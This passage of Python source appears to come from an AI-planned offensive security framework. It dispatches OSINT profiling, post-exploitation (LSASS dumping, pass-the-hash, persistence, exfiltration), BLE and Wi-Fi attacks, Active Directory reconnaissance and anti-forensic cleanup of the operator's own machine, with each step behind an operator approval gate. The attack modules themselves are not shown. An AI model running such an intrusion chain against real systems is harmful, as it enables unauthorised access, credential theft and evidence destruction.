    def _dispatch_osint_probe(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Run one of the 4 passive OSINT intelligence algorithms
        registered in :mod:`core.osint.runner` (username_patterns /
        breach_correlate / phone_carrier / social_graph).

        The algorithm lives IN :mod:`core.osint.runner` (registered via
        ``algo_registry``); this dispatch routes the AI step to the
        registered function ``func(runner, target)`` and records the
        result. The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step` — unlike the legacy ``_execute_step`` path,
        we do NOT re-confirm here (the gate is single, default-deny).
        Args shape::

            {"method": "username_patterns", "target": "<subject>"}

        The returned probe data is merged into ``seed["osint_recon"]`` so
        the re-planner sees the new signal when proposing the next OSINT
        step. Never raises.
        """
        from core.osint.runner import OSINTRunner
        from core.algorithm_registry import algo_registry

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("osint_probe_"):
            method = method[len("osint_probe_"):]
        func = algo_registry.get(method)
        if not func:
            self._emit(
                f"[-] osint_probe: unknown method {method!r}; one of "
                f"{[m['name'] for m in algo_registry.list_by_domain('osint')]}"
            )
            report["skipped"].append(f"osint_probe: unknown method {method}")
            return
        target = (args.get("target") or step.get("target")
                  or seed.get("target") or seed.get("name") or "")
        runner = self.osint_runner or OSINTRunner()
        try:
            res = func(runner, target)
            ok = bool(res and not res.get("error"))
            self._emit(
                f"[+] osint_probe {method}: ok={ok} "
                f"target={target!r}"
            )
            entry = {
                "desc": f"osint_probe {method}",
                "kind": "ai", "action": "osint_probe",
                "tool": f"core.osint.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if ok and isinstance(res, dict):
                seed.setdefault("osint_recon", {})
                seed["osint_recon"][method] = res
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] osint_probe {method} failed: {e}")
            report["skipped"].append(f"osint_probe {method}: {e}")

    def _dispatch_osint_ext(self, step: Dict[str, Any],
                            seed: Dict[str, Any],
                            report: Dict[str, Any]) -> None:
        """Run one of the ~40 OSINT extension methods registered in
        :mod:`core.osint.runner_ext` (OSINT_EXT_METHODS).

        Args shape::

            {"method": "domain_whois", "args": {...}}

        The per-step ACCEPT/CANCEL already fired in :meth:`_walk_ai_step` —
        this dispatcher does NOT re-confirm. The returned probe data is
        merged into ``seed["osint_recon"]`` under the method name. Never
        raises.
        """
        from core.osint.runner_ext import OSINTExtRunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("osint_ext_"):
            method = method[len("osint_ext_"):]
        if not method:
            self._emit("[-] osint_ext: method missing in step")
            report["skipped"].append("osint_ext: method missing")
            return
        if method not in OSINTExtRunner.OSINT_EXT_METHODS:
            self._emit(
                f"[-] osint_ext: unknown method {method!r}; one of "
                f"{list(OSINTExtRunner.OSINT_EXT_METHODS)[:5]}..."
            )
            report["skipped"].append(f"osint_ext: unknown method {method}")
            return
        sub_args = dict(args.get("args") or {})
        # Pass through the per-action input key (domain/email/username/etc.)
        try:
            runner = OSINTExtRunner(args=sub_args)
            res = runner.run_probe(method)
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] osint_ext {method} failed: {e}")
            report["skipped"].append(f"osint_ext {method}: {e}")
            return
        ok = bool(res and res.get("ok"))
        self._emit(f"[+] osint_ext {method}: ok={ok}")
        entry = {
            "desc": f"osint_ext {method}",
            "kind": "ai", "action": "osint_ext",
            "tool": f"core.osint.runner_ext.{method}",
            "method": method, "ok": ok, "result": res,
        }
        report["executed"].append(entry)
        self._record_access(report, entry)
        if ok and isinstance(res, dict):
            seed.setdefault("osint_recon", {})
            seed["osint_recon"][method] = res

    def _dispatch_osint_module(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Run one of the 56 OSINT module algorithms registered in
        :mod:`core.osint.osint_modules` (OSINT_MODULE_FUNCTIONS).

        Args shape::

            {"method": "holehe", "args": {"email": "test@example.com"}}

        The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step` — this dispatcher does NOT re-confirm.
        The returned module data is merged into ``seed["osint_recon"]``
        under the method name. Never raises. Anti-forensic analogues
        (`forensic_module`) live in :mod:`core.forensics.forensic_modules`.
        """
        from core.osint.osint_modules import (
            OSINT_MODULE_FUNCTIONS, run_module,
        )

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("osint_module_"):
            method = method[len("osint_module_"):]
        if not method:
            self._emit("[-] osint_module: method missing in step")
            report["skipped"].append("osint_module: method missing")
            return
        if method not in OSINT_MODULE_FUNCTIONS:
            self._emit(
                f"[-] osint_module: unknown method {method!r}; one of "
                f"{list(OSINT_MODULE_FUNCTIONS)[:5]}..."
            )
            report["skipped"].append(
                f"osint_module: unknown method {method}")
            return
        sub_args = dict(args.get("args") or {})
        try:
            res = run_module(method, sub_args)
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] osint_module {method} failed: {e}")
            report["skipped"].append(f"osint_module {method}: {e}")
            return
        ok = bool(res and res.get("ok"))
        self._emit(f"[+] osint_module {method}: ok={ok}")
        entry = {
            "desc": f"osint_module {method}",
            "kind": "ai", "action": "osint_module",
            "tool": f"core.osint.osint_modules.{method}",
            "method": method, "ok": ok, "result": res,
        }
        report["executed"].append(entry)
        self._record_access(report, entry)
        if ok and isinstance(res, dict):
            seed.setdefault("osint_recon", {})
            seed["osint_recon"][method] = res

    def _dispatch_forensic_module(self, step: Dict[str, Any],
                                  seed: Dict[str, Any],
                                  report: Dict[str, Any]) -> None:
        """Run one of the 54 forensics / anti-forensics module
        algorithms registered in :mod:`core.forensics.forensic_modules`
        (FORENSIC_MODULE_FUNCTIONS).

        Args shape::

            {"method": "file_hash", "args": {"path": "/etc/hostname"}}

        Destructive / lab-only methods (all ``anti_*``) are EMIT-ONLY
        by default — the runner does NOT auto-execute. The chain
        walker is the only path that re-gates. The per-step
        ACCEPT/CANCEL has already fired. The returned module data is
        merged into ``seed["forensic_recon"]`` under the method name.
        Never raises.
        """
        from core.forensics.forensic_modules import (
            FORENSIC_MODULE_FUNCTIONS, run_module,
        )

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("forensic_module_"):
            method = method[len("forensic_module_"):]
        if not method:
            self._emit("[-] forensic_module: method missing in step")
            report["skipped"].append("forensic_module: method missing")
            return
        if method not in FORENSIC_MODULE_FUNCTIONS:
            self._emit(
                f"[-] forensic_module: unknown method {method!r}; "
                f"one of {list(FORENSIC_MODULE_FUNCTIONS)[:5]}..."
            )
            report["skipped"].append(
                f"forensic_module: unknown method {method}")
            return
        sub_args = dict(args.get("args") or {})
        try:
            res = run_module(method, sub_args)
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] forensic_module {method} failed: {e}")
            report["skipped"].append(f"forensic_module {method}: {e}")
            return
        ok = bool(res and res.get("ok"))
        lab_only = bool(res and res.get("lab_only"))
        self._emit(
            f"[+] forensic_module {method}: ok={ok}"
            f"{' [lab_only]' if lab_only else ''}")
        entry = {
            "desc": f"forensic_module {method}",
            "kind": "ai", "action": "forensic_module",
            "tool": f"core.forensics.forensic_modules.{method}",
            "method": method, "ok": ok,
            "lab_only": lab_only, "result": res,
        }
        report["executed"].append(entry)
        self._record_access(report, entry)
        if ok and isinstance(res, dict):
            seed.setdefault("forensic_recon", {})
            seed["forensic_recon"][method] = res

    def _dispatch_post_exploit_probe(self, step: Dict[str, Any],
                                     seed: Dict[str, Any],
                                     report: Dict[str, Any]) -> None:
        """Run one of the 4 post-exploitation analysis algorithms
        registered in :mod:`core.post_exploit.runner` (priv_esc_check /
        cred_enumerate / lateral_movement / persistence_id).

        The algorithm lives IN :mod:`core.post_exploit.runner` (registered
        via ``algo_registry``); this dispatch routes the AI step to the
        registered function ``func(runner, target_info)`` and records the
        result. The per-step ACCEPT/CANCEL already fired in
        :meth:`_walk_ai_step` — we do NOT re-confirm here. Args shape::

            {"method": "priv_esc_check", "target_info": {...}}

        ``target_info`` defaults to the seed (the orchestrator's full
        target/session dict). The returned probe data is merged into
        ``seed["post_exploit_recon"]`` so the re-planner sees the new
        signal when proposing the next post-exploitation step. Never
        raises. These are intrusive (risk=read but operate on an
        accessed target) — emit AFTER access is achieved.
        """
        from core.post_exploit.runner import PostExploitRunner
        from core.algorithm_registry import algo_registry

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("post_exploit_probe_"):
            method = method[len("post_exploit_probe_"):]
        func = algo_registry.get(method)
        if not func:
            self._emit(
                f"[-] post_exploit_probe: unknown method {method!r}; one of "
                f"{[m['name'] for m in algo_registry.list_by_domain('post_exploitation')]}"
            )
            report["skipped"].append(
                f"post_exploit_probe: unknown method {method}")
            return
        target_info = args.get("target_info") or step.get("target_info") or seed
        runner = self.post_exploit_runner or PostExploitRunner()
        try:
            res = func(runner, target_info)
            ok = bool(res and not res.get("error"))
            self._emit(
                f"[+] post_exploit_probe {method}: ok={ok}"
            )
            entry = {
                "desc": f"post_exploit_probe {method}",
                "kind": "ai", "action": "post_exploit_probe",
                "tool": f"core.post_exploit.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if ok and isinstance(res, dict):
                seed.setdefault("post_exploit_recon", {})
                seed["post_exploit_recon"][method] = res
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_exploit_probe {method} failed: {e}")
            report["skipped"].append(f"post_exploit_probe {method}: {e}")

    def _dispatch_post_exploit_ext(self, step: Dict[str, Any],
                                     seed: Dict[str, Any],
                                     report: Dict[str, Any]) -> None:
        """Run one of the 52 post-exploitation extension algorithms from
        :mod:`core.post_exploit.runner_ext` (10 scan/enum + 10 traffic
        capture + 10 client attack + 10 escalation/lateral + 10
        exfil/persist + 2 report).

        The algorithm lives IN :mod:`core.post_exploit.runner_ext`; this
        dispatch routes the AI step to ``runner_ext.run_attack`` and
        records the result. These are INTRUSIVE / DESTRUCTIVE (live
        exploit follow-through, pth, lsass dumping, pivoting, persistence
        install, exfil) — the per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` BEFORE this dispatch runs (single, default-
        deny gate; we do NOT re-confirm here). Args shape::

            {"method": "impacket_psexec",
             "target": "<rhost>", "user": "...", "pass": "...",
             "domain": "...", "share": "..."}

        The never-inline ground rule is honored: a credential value MUST
        be supplied by the operator in args.user/args.pass; it is NEVER
        harvested from a prior step's stdout and inlined into a follow-up
        subprocess's argv by this runner.

        The returned attack data is merged into ``seed["post_exploit_ext"]``
        so the re-planner sees the outcome (e.g. cracked NTLM, dumped
        hashes, persistence artifacts) when proposing the next step. Never
        raises."""
        from core.post_exploit import runner_ext as pext

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("post_exploit_ext_"):
            method = method[len("post_exploit_ext_"):]
        if method not in pext.PostExploitExtRunner.POST_EXPLOIT_EXT_METHODS:
            self._emit(
                f"[-] post_exploit_ext: unknown method {method!r}; one of "
                f"{list(pext.PostExploitExtRunner.POST_EXPLOIT_EXT_METHODS)}")
            report["skipped"].append(
                f"post_exploit_ext: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("post_adapter") \
            or seed.get("interface")
        # Carry the orchestrator seed into args so report-synthesis
        # (llm_report_synth) + crontab-persist operators can see prior
        # post_exploit_ext outcomes.
        if "session" not in args:
            args = dict(args)
            args.setdefault("session", seed)
        try:
            res = pext.run_attack(method=method, adapter=adapter, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] post_exploit_ext {method}: ok={ok} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"post_exploit_ext {method}",
                "kind": "ai", "action": "post_exploit_ext",
                "tool": f"core.post_exploit.runner_ext.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the outcome into the seed so the re-planner sees it
            # (cracked NTLM, dumped hashes, persistence artifacts).
            if isinstance(res.get("data"), dict):
                seed.setdefault("post_exploit_ext", {})
                seed["post_exploit_ext"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] post_exploit_ext {method} failed: {e}")
            report["skipped"].append(f"post_exploit_ext {method}: {e}")

    def _dispatch_post_exploit_anti_forensic(self, step: Dict[str, Any],
                                              seed: Dict[str, Any],
                                              report: Dict[str, Any]) -> None:
        """Run one of the 60 anti-forensic / OPSEC modules from
        :mod:`core.post_exploit.anti_forensic` per ``implementacja_for.txt``.

        These run on the OPERATOR's local box (KFIOSA's own host), NOT
        on the victim. They are anti-forensic for the attacker — they
        clean up KFIOSA's own machine post-engagement.

        The per-step ACCEPT/CANCEL gate (TuiConfirmFn, default-deny 300s)
        already fired in :meth:`_walk_ai_step` BEFORE this dispatch runs
        (single, default-deny gate; we do NOT re-confirm here). Args
        shape::

            {"method": "post_clear_bash_history"}
            {"method": "post_secure_delete_file", "path": "/tmp/foo"}
            {"method": "post_self_destruct"}

        The 5 destructive modules (``post_self_destruct``,
        ``post_secure_delete_file`` un-sandboxed, ``post_wipe_free_space``,
        ``post_clean_pagefile``, ``post_clean_hiberfil``) get a
        "destructive on the local box, ACCEPT?" prompt with the
        destructive wording — set in the gate prompt by the risk
        classifier (the gate itself fires once, here we just route the
        step).

        The returned envelope is merged into ``seed["post_exploit_anti_forensic"]``
        so the re-planner sees which cleanup steps ran. Never raises.
        """
        from core.post_exploit import anti_forensic as af

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("post_exploit_anti_forensic_"):
            method = method[len("post_exploit_anti_forensic_"):]
        if method not in af.POST_EXPLOIT_ANTI_FORENSIC_METHODS:
            self._emit(
                f"[-] post_exploit_anti_forensic: unknown method {method!r}; "
                f"first 5 known: "
                f"{list(af.POST_EXPLOIT_ANTI_FORENSIC_METHODS)[:5]}")
            report["skipped"].append(
                f"post_exploit_anti_forensic: unknown method {method}")
            return
        try:
            res = af.run_anti_forensic(method=method, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] post_exploit_anti_forensic {method}: ok={ok} "
                f"host={res.get('host_os', '?')} risk={res.get('risk', '?')} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"post_exploit_anti_forensic {method}",
                "kind": "ai", "action": "post_exploit_anti_forensic",
                "tool": f"core.post_exploit.anti_forensic.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if isinstance(res.get("data"), dict):
                seed.setdefault("post_exploit_anti_forensic", {})
                seed["post_exploit_anti_forensic"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(
                f"[!] post_exploit_anti_forensic {method} failed: {e}")
            report["skipped"].append(
                f"post_exploit_anti_forensic {method}: {e}")

    def _dispatch_ble_post_exploit(self, step: Dict[str, Any],
                                     seed: Dict[str, Any],
                                     report: Dict[str, Any]) -> None:
        """Run one of the 12 BLE post-exploitation algorithms from
        :mod:`core.ble_post_exploit.runner` (LL/credential/mesh/GATT/
        privacy/LE Audio + LLM coordinator).

        These are INTRUSIVE (LL credential forcing, mesh infiltration,
        GATT integrity attacks, battery drain loops) — the per-step
        ACCEPT/CANCEL gate already fired in :meth:`_walk_ai_step`
        BEFORE this dispatch runs (single, default-deny gate; we do
        NOT re-confirm here). Args shape::

            {"method": "le_credential_forcing",
             "addr": "AA:BB:CC:DD:EE:FF",
             "plan": [{"method": "...", "args": {...}}],  # ble_ai_full_auto_pwn only
             ...}

        The returned attack data is merged into
        ``seed["ble_post_exploit"]`` so the re-planner sees the outcome
        (credential read, mesh UUID presence, FW squat result). Never
        raises."""
        from core.ble_post_exploit import runner as bpe

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("ble_post_exploit_"):
            method = method[len("ble_post_exploit_"):]
        if method not in bpe.BLEPostExploitRunner.BLE_POST_ATTACK_METHODS:
            self._emit(
                f"[-] ble_post_exploit: unknown method {method!r}; one of "
                f"{list(bpe.BLEPostExploitRunner.BLE_POST_ATTACK_METHODS)}")
            report["skipped"].append(
                f"ble_post_exploit: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("post_adapter") \
            or seed.get("adapter")
        try:
            res = bpe.run_attack(method=method, adapter=adapter, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] ble_post_exploit {method}: ok={ok} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"ble_post_exploit {method}",
                "kind": "ai", "action": "ble_post_exploit",
                "tool": f"core.ble_post_exploit.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if isinstance(res.get("data"), dict):
                seed.setdefault("ble_post_exploit", {})
                seed["ble_post_exploit"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] ble_post_exploit {method} failed: {e}")
            report["skipped"].append(f"ble_post_exploit {method}: {e}")

    def _dispatch_extended_ble(self, step: Dict[str, Any],
                               seed: Dict[str, Any],
                               report: Dict[str, Any]) -> None:
        """Run one of the 30 BLE 5.x extended algorithms from
        :mod:`core.extended_ble.runner` (LE Coded PHY, LE 2M, LE Audio,
        periodic advertising, extended advertising, mesh IV update,
        CCC table flood, SMP-timeout DoS, etc).

        These are INTRUSIVE — they hit a real BLE target (GATT, mesh,
        LE Audio, raw LL) and require an operator-supplied target addr.
        The per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` BEFORE this dispatch runs (single, default-
        deny gate; we do NOT re-confirm here). Args shape::

            {"method": "le_audio_bis_sync_jamming",
             "addr": "AA:BB:CC:DD:EE:FF", ...}

        The returned attack data is merged into
        ``seed["extended_ble"]`` so the re-planner sees the outcome
        (e.g. observed RPA set, mesh Proxy PDU, battery delta) when
        proposing the next step. Never raises."""
        from core.extended_ble import runner as eble

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("extended_ble_"):
            method = method[len("extended_ble_"):]
        if method not in eble.EXTENDED_BLE_METHODS:
            self._emit(
                f"[-] extended_ble: unknown method {method!r}; one of "
                f"{list(eble.EXTENDED_BLE_METHODS)}")
            report["skipped"].append(
                f"extended_ble: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("bt_adapter") \
            or seed.get("interface")
        try:
            res = eble.run_attack(method=method, adapter=adapter, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] extended_ble {method}: ok={ok} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"extended_ble {method}",
                "kind": "ai", "action": "extended_ble",
                "tool": f"core.extended_ble.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            # Merge the outcome into the seed so the re-planner sees
            # it (observed RPA, mesh PDU, battery delta, etc).
            if isinstance(res.get("data"), dict):
                seed.setdefault("extended_ble", {})
                seed["extended_ble"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] extended_ble {method} failed: {e}")
            report["skipped"].append(f"extended_ble {method}: {e}")

    def _dispatch_microsoft_attack(self, step: Dict[str, Any],
                                   seed: Dict[str, Any],
                                   report: Dict[str, Any]) -> None:
        """Run one of the 8 Microsoft attack-surface read methods
        from :mod:`core.microsoft.runner` (nmap / impacket lookupsid /
        responder poll / BloodHound collector schedule / certipy AD
        CS / ldapsearch / kerbrute / M365 OpenID tenant recon).

        All 8 are READ — the intrusive / destructive surface
        (impacket psexec, mimikatz, DCSync, PetitPotam coerce, AD
        CS ESC exploitation) is composed from
        :mod:`core.post_exploit.runner_ext` in Phase 2.0.M2 and is
        NOT in this dispatch's allowed set yet. The per-step
        ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` — these are read but still operator-
        gated like every chain step. Args shape::

            {"method": "nmap_smb_rpc_winrm_discovery",
             "target": "10.10.10.1", "ports": [445, 3389]}

        The returned method data is merged into
        ``seed["microsoft"]`` so the re-planner (Part B) sees the
        new signal (open SMB/WinRM/RDP, AD CS templates, kerbrute-
        valid usernames, tenant metadata) when proposing the next
        step. Never raises."""
        from core.microsoft import runner as msrunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        # Permit ``tool`` to carry microsoft_attack_<method> too.
        if method.startswith("microsoft_attack_"):
            method = method[len("microsoft_attack_"):]
        if method not in msrunner.MicrosoftRunner.MICROSOFT_METHODS:
            self._emit(
                f"[-] microsoft_attack: unknown method {method!r}; "
                f"one of {list(msrunner.MicrosoftRunner.MICROSOFT_METHODS)}"
            )
            report["skipped"].append(
                f"microsoft_attack: unknown method {method}")
            return
        try:
            res = msrunner.run_attack(method=method, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] microsoft_attack {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"microsoft_attack {method}",
                "kind": "ai", "action": "microsoft_attack",
                "tool": f"core.microsoft.runner.{method}",
                "method": method,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the probe data into the seed's microsoft dict so
            # the re-planner sees the new signal (smb_open,
            # kerbrute-valid users, AD CS ESC findings, m365
            # tenant metadata) when proposing the next step.
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("microsoft", {})
                seed["microsoft"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] microsoft_attack {method} failed: {e}")
            report["skipped"].append(f"microsoft_attack {method}: {e}")

    def _dispatch_android_attack(self, step: Dict[str, Any],
                                 seed: Dict[str, Any],
                                 report: Dict[str, Any]) -> None:
        """Run one of the Android target-class read methods from
        :mod:`core.android.runner` (adb / frida / apktool / jadx /
        drozer / nmap). The 8 read methods are read-only; the 4
        intrusive methods (frida_trace_attach,
        apktool_repack_with_frida_gadget, adb_logcat_pull,
        drozer_content_provider_enum) land in Phase 2.0.A2. The
        per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` (single-gate invariant). Never raises."""
        from core.android import runner as arunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("android_attack_"):
            method = method[len("android_attack_"):]
        if method not in arunner.AndroidRunner.ANDROID_METHODS:
            self._emit(
                f"[-] android_attack: unknown method {method!r}; "
                f"one of {list(arunner.AndroidRunner.ANDROID_METHODS)}"
            )
            report["skipped"].append(
                f"android_attack: unknown method {method}")
            return
        try:
            res = arunner.run_attack(method=method, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] android_attack {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"android_attack {method}",
                "kind": "ai", "action": "android_attack",
                "tool": f"core.android.runner.{method}",
                "method": method,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("android", {})
                seed["android"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] android_attack {method} failed: {e}")
            report["skipped"].append(f"android_attack {method}: {e}")

    def _dispatch_ios_attack(self, step: Dict[str, Any],
                             seed: Dict[str, Any],
                             report: Dict[str, Any]) -> None:
        """Run one of the iOS target-class read methods from
        :mod:`core.ios.runner` (libimobiledevice / usbmuxd / frida
        ios-dump / objection / nmap apple-mdns). The 8 read
        methods are read-only; the 4 intrusive methods
        (ssl_kill_switch_attach, objection_run_method,
        frida_trace_class, idevicebackup2_extract) land in
        Phase 2.0.I2. The per-step ACCEPT/CANCEL gate already
        fired in :meth:`_walk_ai_step` (single-gate invariant).
        Never raises."""
        from core.ios import runner as irunner

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("ios_attack_"):
            method = method[len("ios_attack_"):]
        if method not in irunner.IOSRunner.IOS_METHODS:
            self._emit(
                f"[-] ios_attack: unknown method {method!r}; "
                f"one of {list(irunner.IOSRunner.IOS_METHODS)}"
            )
            report["skipped"].append(
                f"ios_attack: unknown method {method}")
            return
        try:
            res = irunner.run_attack(method=method, args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] ios_attack {method}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"ios_attack {method}",
                "kind": "ai", "action": "ios_attack",
                "tool": f"core.ios.runner.{method}",
                "method": method,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("ios", {})
                seed["ios"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] ios_attack {method} failed: {e}")
            report["skipped"].append(f"ios_attack {method}: {e}")

    def _dispatch_live_target(self, step: Dict[str, Any],
                              seed: Dict[str, Any],
                              report: Dict[str, Any]) -> None:
        """Run one of the polyglot live-target safe patches from
        :mod:`core.live_target` (PowerShell / C# / Java / Smali /
        Swift / plist / Mach-O / Frida script / BloodHound cypher).

        The runner edits KFIOSA's own emitted artifacts (a saved
        .cypher, a Frida .js, a .plist snippet, a .ps1 wrapper) —
        NOT the target machine's code. The validator rejects
        shell metas and dangerous APIs. The per-step ACCEPT/CANCEL
        gate already fired in :meth:`_walk_ai_step` (single-gate
        invariant). Never raises."""
        from core.live_target import run_patch, LIVE_TARGET_PATCHES

        args = step.get("args", {}) or {}
        patch_id = (args.get("patch_id") or step.get("tool") or "").strip()
        target_class = (args.get("target_class")
                        or seed.get("target_class") or "")
        if patch_id not in LIVE_TARGET_PATCHES:
            self._emit(
                f"[-] live_target: unknown patch_id {patch_id!r}; "
                f"one of {list(LIVE_TARGET_PATCHES)}"
            )
            report["skipped"].append(
                f"live_target: unknown patch_id {patch_id}")
            return
        try:
            res = run_patch(patch_id=patch_id, target_class=target_class,
                            params=args.get("params") or {})
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] live_target {patch_id}: ok={ok} "
                f"error={res.get('error') or 'none'}"
            )
            entry = {
                "desc": f"live_target {patch_id}",
                "kind": "ai", "action": "live_target",
                "tool": f"core.live_target.{patch_id}",
                "patch_id": patch_id,
                "ok": ok,
                "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            if ok and isinstance(res.get("data"), dict):
                seed.setdefault("live_target", {})
                seed["live_target"][patch_id] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] live_target {patch_id} failed: {e}")
            report["skipped"].append(f"live_target {patch_id}: {e}")

    def _dispatch_extended_wifi(self, step: Dict[str, Any],
                                  seed: Dict[str, Any],
                                  report: Dict[str, Any]) -> None:
        """Run one of the 60 advanced WiFi (HE / Wi-Fi 6 / 7 / WPA3 / AI)
        algorithms from :mod:`core.extended_wifi.runner`.

        The algorithm lives IN :mod:`core.extended_wifi.runner`; this
        dispatch routes the AI step to ``runner.run_attack`` and records
        the result. Most are INTRUSIVE / DESTRUCTIVE (raw 802.11ax frame
        injection, EAPOL replay, fuzzing, channel-state corruption) — the
        per-step ACCEPT/CANCEL gate already fired in
        :meth:`_walk_ai_step` BEFORE this dispatch runs (single, default-
        deny gate; we do NOT re-confirm here). Args shape::

            {"method": "ofdma_resource_stealing",
             "bssid": "...", "station": "...", "channel": 6,
             "cap_file": "/tmp/...pcap", "count": 10, "ssids": [...]}

        The returned attack data is merged into ``seed["extended_wifi"]``
        so the re-planner sees the outcome when proposing the next step.
        Never raises."""
        from core.extended_wifi import runner as extwifi

        args = step.get("args", {}) or {}
        method = (args.get("method") or step.get("tool") or "").strip()
        if method.startswith("ext_wifi_"):
            method = method[len("ext_wifi_"):]
        if method not in extwifi.ExtendedWiFiRunner.EXT_WIFI_METHODS:
            self._emit(
                f"[-] extended_wifi: unknown method {method!r}; one of "
                f"{list(extwifi.ExtendedWiFiRunner.EXT_WIFI_METHODS)}")
            report["skipped"].append(
                f"extended_wifi: unknown method {method}")
            return
        adapter = args.get("adapter") or seed.get("post_adapter") \
            or seed.get("interface")
        try:
            res = extwifi.run_attack(method=method, adapter=adapter,
                                       args=args)
            ok = bool(res.get("ok"))
            self._emit(
                f"[+] extended_wifi {method}: ok={ok} "
                f"error={res.get('error') or 'none'}")
            entry = {
                "desc": f"extended_wifi {method}",
                "kind": "ai", "action": "extended_wifi",
                "tool": f"core.extended_wifi.runner.{method}",
                "method": method, "ok": ok, "result": res,
            }
            report["executed"].append(entry)
            self._record_access(report, entry)
            # Merge the outcome into the seed so the re-planner sees it
            # (injection result, fuzz outcome, ML heuristic score).
            if isinstance(res.get("data"), dict):
                seed.setdefault("extended_wifi", {})
                seed["extended_wifi"][method] = res.get("data")
        except Exception as e:  # noqa: BLE001
            self._emit(f"[!] extended_wifi {method} failed: {e}")
            report["skipped"].append(f"extended_wifi {method}: {e}")

    # ------------------------------------------------------------------
    def _build_steps(self, domain: str, seed: Dict[str, Any],
                     report: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Build the ordered real/info step list from the AI plan + domain."""
        steps: List[Dict[str, Any]] = []
        if domain == "wifi":
            bssid = seed.get("bssid") or seed.get("BSSID") or "<BSSID>"
            ch = seed.get("channel") or "<ch>"
            iface = seed.get("interface") or self.interface or "<monitor_iface>"
            ssid = seed.get("ssid") or "<ssid>"
            steps = [
                {"kind": "real", "desc": f"airodump-ng capture {bssid} ch{ch} on {iface}",
                 "action": "airodump", "iface": iface, "bssid": bssid, "channel": ch},
                {"kind": "real", "desc": f"PMKID capture via hcxdumptool on {bssid} ch{ch}",
                 "action": "pmkid", "bssid": bssid, "channel": ch,
